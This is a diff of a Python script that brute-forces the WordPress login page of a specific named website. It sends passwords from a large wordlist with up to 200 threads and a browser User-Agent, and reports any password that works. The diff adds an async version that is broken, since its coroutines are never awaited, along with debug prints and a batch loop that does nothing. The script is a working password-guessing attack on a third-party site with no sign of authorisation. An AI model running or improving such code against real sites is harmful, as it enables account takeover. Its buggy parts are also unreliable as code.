@@ -1,4 +1,6 @@
 import requests
+import aiohttp
+import asyncio
 import concurrent
 from concurrent.futures import ThreadPoolExecutor
 
@@ -18,10 +20,23 @@ def guess_password(bruteforce_url, data, headers, cookies):
         )
     return response
 
+async def async_guess_password(session, bruteforce_url, data, headers, cookies):
+    async with session.post(
+        url=bruteforce_url, data=data, cookies=cookies, headers=headers
+        ) as response:
+        return response.json()
+
+
+async def main(password_list, bruteforce_url, headers, cookies):
+    async with aiohttp.ClientSession() as session:
+        for password in password_list:
+            response = async_guess_password(session, bruteforce_url=bruteforce_url, data=get_post_data(password=password), headers=headers, cookies=cookies)
+            print(f"{response['text']}") 
+
 
 if __name__ == "__main__":
     # initialization
-    threads = 100
+    threads = 200
     bruteforce_url = 'https://rs11.glorifykickstarter.com/wp-login.php'
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
@@ -39,26 +54,35 @@ if __name__ == "__main__":
     password_list = []
     # getting passwords from a file
     with open('/home/kali/wordlists/passwords-large.txt', encoding = 'utf-8') as passwords_file:
-        for line in passwords_file:
-            password_list.append(passwords_file.readline().strip())
+        for line in passwords_file.readlines():
+            password_list.append(line.rstrip())
     
-    
+    print(len(password_list))
+    print(password_list[0])
+    # asyncio.run(
+    #     main(password_list=password_list[0:10], bruteforce_url=bruteforce_url,
+    #     headers=headers, cookies=cookies)
+    # )
+    step = 100
     with ThreadPoolExecutor(max_workers=threads) as executor:
         future_to_url = {
-            executor.submit(
-                guess_password, bruteforce_url, get_post_data(password), headers, cookies
-                )
-            for password in password_list[200:]
-            }
-        for future in concurrent.futures.as_completed(future_to_url):
+            executor.submit(guess_password, bruteforce_url, get_post_data(password), headers, cookies)
+            for password in password_list[400:402] 
+        }
+        for batch in range(400, len(password_list), step):
+            print(f'Batch start: {batch}')
+
+        print(type(future_to_url), len(password_list))
+        completed_futures = enumerate(concurrent.futures.as_completed(future_to_url))
+        for index, future in completed_futures:
             try:
                 response = future.result()
                 if response.status_code == 200 :
                     if response.text.find('incorrect') > -1:
-                        print(f'{response.status_code} but incorrect password')
+                        print(f'request {index}: {response.status_code} but incorrect password')
                     else:
-                        print(f'{response.status} with correct password! Password: {response.request.data["pwd"]}') 
+                        print(f'request {index}: {response.status} with correct password! Password: {response.request.data["pwd"]}') 
                 elif response.status_code == 406:
-                    print(f'{response.status_code}, probably a timeout')
+                    print(f'request {index}: {response.status_code}, probably a timeout')
             except Exception as e:
                 print('Looks like something went wrong:', e)
